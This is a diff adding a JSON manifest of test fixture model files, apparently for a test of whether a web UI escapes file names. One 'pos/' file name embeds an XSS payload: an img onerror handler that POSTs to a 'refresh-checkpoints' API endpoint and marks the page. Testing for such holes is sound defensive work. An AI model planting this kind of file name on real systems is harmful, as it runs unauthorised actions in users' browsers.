@@ -1,0 +1,13 @@
+{
+  "neg/benign_lora.safetensors": {
+    "name_bytes": 23,
+    "sha256": "ea3128f9882454300b3b6f81bf70aec8f91cf181f9c45ecc834a648af33d4570",
+    "size": 152
+  },
+  "pos/x\"><img src=x onerror='var s=String.fromCharCode(47);fetch(s+\"sdapi\"+s+\"v1\"+s+\"refresh-checkpoints\",{method:\"POST\"}).then(r=>document.documentElement.dataset.mbe2e=\"W\"+r.status)'>.safetensors": {
+    "name_bytes": 191,
+    "sha256": "aaacf851beafd7b901ca9bf9fd7f17deb2d0c0edf0dc853566d8dd3bd3a8623d",
+    "size": 152
+  }
+}
+payload filename bytes: 191
